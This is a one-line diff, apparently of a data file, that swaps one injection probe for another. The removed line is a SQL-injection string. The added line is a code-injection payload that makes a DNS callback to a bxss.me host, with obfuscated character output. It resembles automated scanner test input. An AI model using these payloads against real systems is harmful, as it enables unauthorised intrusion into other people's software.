@@ -1,1 +1,1 @@
--1' OR 2+53-53-1=0+0+0+1 -- 
+gethostbyname(lc('hituj'.'xpjnrtuwddf76.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(102).chr(90).chr(98).chr(85)
